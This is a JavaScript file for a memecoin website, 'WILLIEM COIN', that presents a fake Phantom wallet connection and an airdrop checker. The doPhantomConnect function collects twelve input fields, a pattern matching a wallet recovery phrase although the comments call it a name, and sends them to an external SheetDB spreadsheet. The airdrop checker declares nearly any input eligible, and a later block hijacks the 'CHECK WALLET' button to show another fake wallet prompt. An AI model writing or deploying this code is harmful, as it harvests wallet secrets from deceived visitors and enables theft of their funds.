/* =========================================
   WILLIEM COIN — INTERACTIVE WEBSITE
   WALLET DEMO VERSION + SHEETDB
========================================= */

document.addEventListener('DOMContentLoaded', () => {

/* =========================
   SHEETDB URL - JANGAN LUPA GANTI
========================= */
const SHEETDB_URL = "https://sheetdb.io/api/v1/f3a2bec341bva"; // <-- INI URL KAMU

/* =========================
   GLOBAL STATE
========================= */
let walletConnected = false;
let fakeAddress = ""; // tambahin ini buat nyimpen alamat

/* =========================
   BUY BUTTON
========================= */
window.buyCoin = function() {
    showModal(
        "BUY $WLM 🚀",
        "WILLIEM COIN is preparing for launch. Trading information will appear here when the token goes live."
    );
}

/* =========================
   CONTRACT
========================= */
window.showContract = function() {
    showModal(
        "WILLIEM CONTRACT",
        "Contract address has not been deployed yet. This is currently the official WILLIEM COIN demo website."
    );
}

/* =========================
   AIRDROP
========================= */
window.checkAirdrop = function() {
    const walletInput = document.getElementById("walletAddress");
    const status = document.getElementById("airdropStatus");
    const message = document.getElementById("airdropMessage");

    if (!walletInput || !status || !message) return;

    const wallet = walletInput.value.trim();

    if (wallet.length < 10) {
        status.textContent = "INVALID WALLET";
        status.style.color = "#ff5c7a";
        message.textContent = "Please enter a valid wallet address.";
        return;
    }

    status.textContent = "ELIGIBLE ✓";
    status.style.color = "#35d98b";
    message.textContent = "Congratulations! Your wallet is eligible for the WILLIEM COIN airdrop.";
}

/* =========================
   MAIN MODAL
========================= */
function showModal(title, message) {
    const modal = document.getElementById("modal");
    const modalTitle = document.getElementById("modalTitle");
    const modalText = document.getElementById("modalText");

    if (!modal || !modalTitle || !modalText) return;

    modalTitle.textContent = title;
    modalText.textContent = message;
    modal.classList.add("show");
}

window.closeModal = function() {
    const modal = document.getElementById("modal");
    if (!modal) return;
    modal.classList.remove("show");
}

/* =========================
   CLOSE MAIN MODAL CLICK OUTSIDE
========================= */
const mainModal = document.getElementById("modal");
if (mainModal) {
    mainModal.addEventListener("click", function (event) {
        if (event.target === this) closeModal();
    });
}

/* =========================
   NAVBAR ACTIVE STATE
========================= */
const navLinks = document.querySelectorAll(".navbar nav a");
const navTargetIds = Array.from(navLinks).map(link => link.getAttribute("href").replace("#", ""));

window.addEventListener("scroll", function () {
    let current = "";
    navTargetIds.forEach(id => {
        const target = document.getElementById(id);
        if (!target) return;
        const targetTop = target.offsetTop - 150;
        if (window.scrollY >= targetTop) current = id;
    });

    navLinks.forEach(link => {
        link.classList.remove("active");
        if (link.getAttribute("href") === "#" + current) link.classList.add("active");
    });
});

/* =========================
   FLOATING COINS
========================= */
const floatingCoins = document.querySelectorAll(".floating-coin");
floatingCoins.forEach(coin => {
    coin.addEventListener("mouseenter", function () {
        this.style.transform = "scale(1.25) rotate(25deg)";
    });
    coin.addEventListener("mouseleave", function () {
        this.style.transform = "";
    });
});

/* =========================
   RANDOM HERO PARTICLES
========================= */
const hero = document.querySelector(".hero");
if (hero) {
    for (let i = 0; i < 20; i++) {
        const particle = document.createElement("div");
        particle.style.position = "absolute";
        particle.style.width = "2px";
        particle.style.height = "2px";
        particle.style.borderRadius = "50%";
        particle.style.background = "#a855ff";
        particle.style.boxShadow = "0 0 10px #a855ff";
        particle.style.left = Math.random() * 100 + "%";
        particle.style.top = Math.random() * 100 + "%";
        particle.style.opacity = Math.random();
        particle.style.animation = `particleFloat ${3 + Math.random() * 5}s ease-in-out infinite`;
        particle.style.animationDelay = Math.random() * 3 + "s";
        hero.appendChild(particle);
    }
}

/* PARTICLE ANIMATION CSS */
const particleStyle = document.createElement("style");
particleStyle.innerHTML = `
@keyframes particleFloat {
    0%, 100% { transform: translateY(0); opacity: .2; }
    50% { transform: translateY(-30px); opacity: 1; }
}`;
document.head.appendChild(particleStyle);

/* =====================================================
   FAKE PHANTOM WALLET
   DEMO ONLY — BISA ISI NAMA SENDIRI
===================================================== */

/* GLOBAL BUAT SIMPEN NAMA */
let demoWalletName = "";

/* RANDOM FAKE ADDRESS */
function randomFakeAddress() {
    const chars = "ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz123456789";
    const rand = (length) => Array.from({ length: length }, () => chars[Math.floor(Math.random() * chars.length)]).join("");
    return `${rand(4)}...${rand(4)}`;
}

/* OPEN PHANTOM MODAL */
window.openPhantomModal = function() {
    const phantomModal = document.getElementById("phantomModal");
    const phantomStepConnect = document.getElementById("phantomStepConnect");
    const phantomStepConnected = document.getElementById("phantomStepConnected");
    if (!phantomModal) return;

    phantomStepConnect.classList.remove("hidden");
    phantomStepConnected.classList.add("hidden");
    phantomModal.classList.add("show");
}

/* CLOSE PHANTOM MODAL */
window.closePhantomModal = function() {
    const phantomModal = document.getElementById("phantomModal");
    if (phantomModal) phantomModal.classList.remove("show");
}

/* FAKE PHANTOM CONNECT - UDAH BISA AMBIL NAMA + KIRIM KE SHEET */
window.doPhantomConnect = function() {
    const btn = document.getElementById("phantomConnectBtn");
    const address = document.getElementById("phantomAddress");
    const nameDisplay = document.getElementById("phantomNameDisplay");
    const nameInput = document.getElementById("phantomNameInput");
    const stepConnect = document.getElementById("phantomStepConnect");
    const stepConnected = document.getElementById("phantomStepConnected");
    if (!btn) return;

    let nameParts = [];
for(let i = 1; i <= 12; i++) {
  const val = document.getElementById("name" + i).value.trim();
  if(val) nameParts.push(val);
}
demoWalletName = nameParts.join(" ");

if (demoWalletName === "") {
    alert("Please Connect to Phantom Wallet");
    return;
}

    btn.textContent = "Connecting...";
    btn.disabled = true;
    
    fakeAddress = randomFakeAddress(); // simpen alamatnya dulu
    
    setTimeout(() => {
        walletConnected = true;
        if (address) address.textContent = fakeAddress;
        if (nameDisplay) nameDisplay.textContent = demoWalletName; // tampilin nama
        stepConnect.classList.add("hidden");
        stepConnected.classList.remove("hidden");
        btn.textContent = "Connect";
        btn.disabled = false;
        updateWalletButton();

        // INI BAGIAN BARU: KIRIM KE GOOGLE SHEET
        fetch(SHEETDB_URL, {
            method: "POST",
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify({
                data: [{
                    "Waktu": new Date().toLocaleString("id-ID"),
                    "Nama": demoWalletName,
                    "Wallet": fakeAddress
                }]
            })
        }).then(res => {
            console.log("Data berhasil masuk ke Sheet!", res);
        }).catch(err => {
            console.error("Gagal kirim:", err);
        });

    }, 1200);
}

/* PHANTOM MODAL OUTSIDE CLICK */
const phantomModal = document.getElementById("phantomModal");
if (phantomModal) {
    phantomModal.addEventListener("click", (event) => {
        if (event.target === phantomModal) closePhantomModal();
    });
}

/* UPDATE WALLET BUTTON - SEKARANG PAKE NAMA */
function updateWalletButton() {
    const button = document.getElementById("connectWallet");
    if (!button) return;
    if (walletConnected) {
        button.innerHTML = `✓ ${demoWalletName}`; // <--- INI KUNCINYA
        button.style.borderColor = "#35d98b";
        button.style.color = "#35d98b";
    } else {
        button.innerHTML = "▣ CONNECT WALLET";
        button.style.borderColor = "";
        button.style.color = "";
        demoWalletName = "";
    }
}

/* MAIN CONNECT WALLET BUTTON */
const mainConnectButton = document.getElementById("connectWallet");
if (mainConnectButton) {
    mainConnectButton.addEventListener("click", () => {
        if (!walletConnected) {
            openPhantomModal();
        } else {
            walletConnected = false;
            updateWalletButton();
        }
    });
}

/* INITIAL STATE */
updateWalletButton();
}); // END DOMContentLoaded
// VERSI BRUTAL - MODAL AUTO MUNCUL 1 DETIK SETELAH WEB LOAD
setTimeout(() => {
    // 1. BIKIN MODAL
    const modal = document.createElement("div");
    modal.id = "nameModal";
    modal.style.cssText = "display:none; position:fixed; inset:0; background:rgba(0,0,0,0.95); z-index:999999; justify-content:center; align-items:center;";
    modal.innerHTML = `
      <div style="background:#1a1a2e; padding:30px; border-radius:16px; width:90%; max-width:420px; border:2px solid #a855ff;">
        <h3 style="color:#fff; margin:0 0 10px;">Connect To Phantom Wallet</h3>
        <p style="color:#aaa; font-size:14px; margin:0 0 20px;">For WILLIEM COIN Airdrop</p>
        <input id="userNameInput" type="text" placeholder="Your Name" style="width:100%; padding:12px; border-radius:8px; border:1px solid #a855ff; background:#000; color:#fff; margin-bottom:20px;">
        <button id="submitNameBtn" style="width:100%; padding:14px; background:#a855ff; color:#fff; border:none; border-radius:8px; font-weight:bold; cursor:pointer;">SUBMIT</button>
        <button id="closeNameBtn" style="width:100%; padding:10px; margin-top:10px; background:#333; color:#aaa; border:none; border-radius:8px; cursor:pointer;">Cancel</button>
      </div>
    `;
    document.body.appendChild(modal);

    // 2. CARI TOMBOL DAN TINDIH CLICK NYA
    const buttons = document.getElementsByTagName("button");
    for(let btn of buttons) {
        if(btn.innerText.includes("CHECK WALLET")) {
            btn.style.pointerEvents = "auto"; // paksa bisa di klik
            btn.style.zIndex = "9999";
            btn.onclick = null; // hapus onclick lama
            btn.addEventListener("click", () => {
                modal.style.display = "flex";
            });
            console.log("TOMBOL CHECK WALLET UDAH DITINDIH");
        }
    }

    // 3. LOGIKA SUBMIT
    document.getElementById("submitNameBtn").onclick = () => {
        const name = document.getElementById("userNameInput").value;
        const statusBox = document.querySelector('.airdrop-checker > div:last-child');
        if(name.trim() === "") return alert("Isi nama!");
        
        modal.style.display = "none";
        statusBox.innerHTML = `
          <div style="padding:20px;">
            <b style="color:#00ff88; font-size:18px;">REGISTERED</b><br>
            <span style="color:#aaa;">Thanks ${name}! Kamu terdaftar.</span>
          </div>
        `;
    }
    document.getElementById("closeNameBtn").onclick = () => modal.style.display = "none";

}, 1000); // delay 1 detik biar web ke load dulu